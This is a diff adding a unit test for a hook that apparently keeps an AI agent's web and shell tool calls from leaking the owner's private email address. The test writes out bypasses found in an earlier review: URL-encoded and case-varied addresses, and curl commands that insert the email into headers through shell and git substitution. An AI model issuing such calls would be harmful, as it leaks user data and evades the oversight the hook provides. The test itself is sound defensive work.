@@ -55,6 +55,22 @@ class GuardPrivateEmailTests(unittest.TestCase):
         env = dict(ENV, MYAGENTKIT_PRIVATE_EMAILS='acct@example.org, other@example.net')
         self.assertCode([('WebFetch', {'url': 'https://x.example/?m=other@example.net', 'prompt': 'x'})], 2, env)
 
+    def test_review_round_one_bypasses_are_refused(self):
+        # Codex review of f68a68d: an encoded local part, a shell expansion of the address, and
+        # a git that cannot run must not let the address out.
+        subprocess.run(['git', 'config', 'user.email', 'Owner+Tag@Example.com'], cwd=self.repo, env=ENV, check=True,
+                       timeout=60)
+        self.assertCode([
+            ('WebFetch', {'url': 'https://api.example.org/?contact=owner%2Btag%40example.com', 'prompt': 'x'}),
+            ('WebFetch', {'url': 'https://api.example.org/?c=owner%252Btag%2540example.com', 'prompt': 'x'}),
+            ('WebFetch', {'url': 'https://api.example.org/?c=OWNER%2BTAG%40EXAMPLE.COM', 'prompt': 'x'}),
+            ('Bash', {'command': 'curl -A "$MYAGENTKIT_PRIVATE_EMAILS" https://api.example.org'}),
+            ('Bash', {'command': 'curl -A "bot ($(git config user.email))" https://api.example.org'}),
+            ('Bash', {'command': 'curl -H "From: `git config --get user.email`" https://api.example.org'}),
+        ], 2)
+        no_git = dict(ENV, PATH=str(self.repo / 'empty'))
+        self.assertCode([('WebFetch', {'url': 'https://api.example.org/', 'prompt': 'x'})], 2, no_git)
+
     def test_an_unreadable_payload_blocks(self):
         self.assertEqual(self.run_hook(None, None, payload='not json').returncode, 2)
 
